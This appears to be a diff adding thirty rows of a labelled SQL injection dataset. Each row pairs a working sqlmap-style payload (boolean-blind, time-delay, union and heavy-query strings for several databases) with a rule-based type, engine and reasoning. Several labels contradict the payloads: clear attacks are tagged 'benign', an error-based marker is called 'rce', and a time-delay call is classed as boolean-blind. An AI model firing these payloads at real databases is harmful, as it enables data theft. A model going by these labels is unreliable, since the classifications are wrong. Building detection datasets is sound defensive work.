@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+4740,"1"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""ldlp"" = ""ldlp",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+4741,1'+ ( select 'phtz' where 3171 = 3171,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4742,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4743,"-1647' ) ) union all select 3030,3030,3030,3030,3030,3030,3030--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4744,1' ) ) rlike sleep ( 5 ) and ( ( 'qitl' like 'qitl,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4745,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'ggiw' = 'ggiw",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+4746,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4747,1' ) and 1987 = 3756#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4748,-9024 ) where 1686 = 1686 or 3069 = 8213--,1,,boolean_blind,generic,0.95,1686 = 1686 or detected — boolean_blind injection (priority 8) on generic,rule-based
+4749,-5995' ) ) or 6872 = 6872 and ( ( 'pywh' = 'pywh,1,,boolean_blind,generic,0.95,6872 = 6872 and detected — boolean_blind injection (priority 8) on generic,rule-based
+4750,1 ) ) as oqui where 3368 = 3368 order by 1--,1,,boolean_blind,generic,0.95,3368 = 3368 or detected — boolean_blind injection (priority 8) on generic,rule-based
+4751,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4752,"1' ) as xagu where 9088 = 9088 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4753,1' in boolean mode ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4754,"-4543"" ) or 3038 = 3038",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4755,1 ) where 3381 = 3381,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4756,"-6160' ) ) ) or make_set ( 1924 = 4415,4415 ) and ( ( ( 'hayr' = 'hayr",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+4757,1 or sleep ( 5 ),1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+4758,1'+ ( select cxvy where 7421 = 7421,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4759,"-1439"" or 2849 = 8484 and ""pmdl"" = ""pmdl",1,,boolean_blind,generic,0.95,2849 = 8484 and detected — boolean_blind injection (priority 8) on generic,rule-based
+4760,1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,,boolean_blind,firebird,0.95,6120 = 6120 and detected — boolean_blind injection (priority 8) on firebird,rule-based
+4761,"-8425"" ) ) or ( 6485 = 1127 ) *1127 and ( ( ""qruf"" = ""qruf",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
+4762,"1"" ) as drrx where 8633 = 8633 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4763,"1%"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""%"" = """,1,,boolean_blind,mysql,0.95,) and ( detected — boolean_blind injection (priority 8) on mysql,rule-based
+4764,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+4765,-8701%' ) ) or ( 4843 = 1690 ) *1690 and ( ( '%' = ',1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
+4766,"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'crus' = 'crus",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+4767,"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4768,"1"" ) as upjw where 3880 = 3880 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
+4769,"1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,boolean_blind,generic,0.95,3943 = 3943 and detected — boolean_blind injection (priority 8) on generic,rule-based
